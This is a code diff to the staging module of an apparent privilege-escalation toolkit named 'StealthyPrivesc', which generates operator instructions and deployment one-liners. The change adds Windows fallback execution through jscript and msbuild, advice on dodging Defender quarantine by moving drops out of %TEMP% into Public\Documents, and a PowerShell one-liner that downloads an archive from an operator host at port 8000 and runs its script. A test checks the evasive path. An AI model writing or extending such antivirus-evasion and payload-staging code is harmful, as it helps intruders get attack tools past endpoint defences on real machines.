@@ -151,7 +151,7 @@ pub fn stage(opts: StageOptions<'_>) -> Result<PathBuf> {
     }
 
     let fallback_order = if opts.os == "windows" {
-        "powershell"
+        "powershell,jscript,msbuild"
     } else {
         "python,bash"
     };
@@ -187,24 +187,29 @@ pub fn stage(opts: StageOptions<'_>) -> Result<PathBuf> {
         format!("{hash}  {bin_name}\n"),
     )?;
 
-    let operator = format!(
-        "StealthyPrivesc stage bundle\n\
-         os={} arch={} name={}\n\
-         binary_sha256={}\n\n\
-         Verify:\n  stealthy verify --path ./{bin_name} --expect-sha256 {hash}\n\n\
-         Enumerate (requires a fresh operator acknowledgment):\n  {} ./scripts/{} --authorized --profile balanced enum\n\n\
-         Cleanup:\n  stealthy cleanup --latest --secure-delete\n",
-        opts.os,
-        opts.arch,
-        opts.name,
-        hash,
-        if opts.os == "windows" { "&" } else { "bash" },
-        if opts.os == "windows" {
-            "run.ps1"
-        } else {
-            "run.sh"
-        }
-    );
+    let operator = if opts.os == "windows" {
+        format!(
+            "StealthyPrivesc stage bundle\n\
+             os={} arch={} name={}\n\
+             binary_sha256={}\n\n\
+             Verify:\n  stealthy verify --path ./{bin_name} --expect-sha256 {hash}\n\n\
+             Enumerate (requires a fresh operator acknowledgment):\n  & ./scripts/run.ps1 --authorized --profile balanced enum\n\n\
+             If the PE is missing or quarantined by AV:\n  Prefer a non-TEMP drop path and a lab path exclusion / org-signed PE.\n  & ./scripts/run.ps1 --authorized --profile balanced enum\n  (dispatcher walks windows_fallbacks: powershell,jscript,msbuild)\n\n\
+             Lab tip: avoid %TEMP% for the kit; Public\\Documents\\<name> is quieter.\n\n\
+             Cleanup:\n  stealthy cleanup --latest --secure-delete\n",
+            opts.os, opts.arch, opts.name, hash
+        )
+    } else {
+        format!(
+            "StealthyPrivesc stage bundle\n\
+             os={} arch={} name={}\n\
+             binary_sha256={}\n\n\
+             Verify:\n  stealthy verify --path ./{bin_name} --expect-sha256 {hash}\n\n\
+             Enumerate (requires a fresh operator acknowledgment):\n  bash ./scripts/run.sh --authorized --profile balanced enum\n\n\
+             Cleanup:\n  stealthy cleanup --latest --secure-delete\n",
+            opts.os, opts.arch, opts.name, hash
+        )
+    };
     fs::write(opts.out_dir.join("OPERATOR.txt"), operator)?;
 
     let mut ledger = ArtifactLedger::new(opts.run_id);
@@ -272,10 +277,12 @@ Invoke-Command -ComputerName HOST -ScriptBlock {
   & 'C:\Users\Public\Documents\cache-update\scripts\run.ps1' --authorized --profile quiet enum
 }
 "#.into(),
-        ("windows", "http") => r#"# HTTP pull on Windows
-Invoke-WebRequest -Uri http://OPERATOR:8000/drop.zip -OutFile $env:TEMP\stealthy-drop.zip
-Expand-Archive -Force $env:TEMP\stealthy-drop.zip $env:TEMP\stealthy-drop
-& "$env:TEMP\stealthy-drop\scripts\run.ps1" --authorized --profile quiet enum
+        ("windows", "http") => r#"# HTTP pull on Windows (avoid %TEMP%: Defender often quarantines fresh PEs there)
+$Dir = Join-Path $env:PUBLIC 'Documents\cache-update'
+New-Item -ItemType Directory -Force -Path $Dir | Out-Null
+Invoke-WebRequest -Uri http://OPERATOR:8000/drop.zip -OutFile (Join-Path $Dir 'drop.zip')
+Expand-Archive -Force (Join-Path $Dir 'drop.zip') $Dir
+& (Join-Path $Dir 'scripts\run.ps1') --authorized --profile quiet enum
 "#.into(),
         ("linux", "smb") => r#"# Copy from mounted engagement share
 mkdir -p /tmp/cache-update
@@ -290,7 +297,7 @@ bash /tmp/cache-update/scripts/run.sh --authorized --profile quiet enum
 
 #[cfg(test)]
 mod tests {
-    use super::{shell_quote, validate_bundle_name};
+    use super::{one_liners, shell_quote, validate_bundle_name};
 
     #[test]
     fn shell_quote_contains_metacharacters_as_data() {
@@ -304,5 +311,13 @@ mod tests {
             assert!(validate_bundle_name(name).is_err(), "accepted {name:?}");
         }
         assert!(validate_bundle_name("stealthy").is_ok());
+    }
+
+    #[test]
+    fn windows_http_one_liner_avoids_temp() {
+        let snippet = one_liners("windows", "http");
+        assert!(snippet.contains("PUBLIC"));
+        assert!(snippet.contains("Documents\\cache-update"));
+        assert!(!snippet.contains("$env:TEMP\\stealthy-drop"));
     }
 }
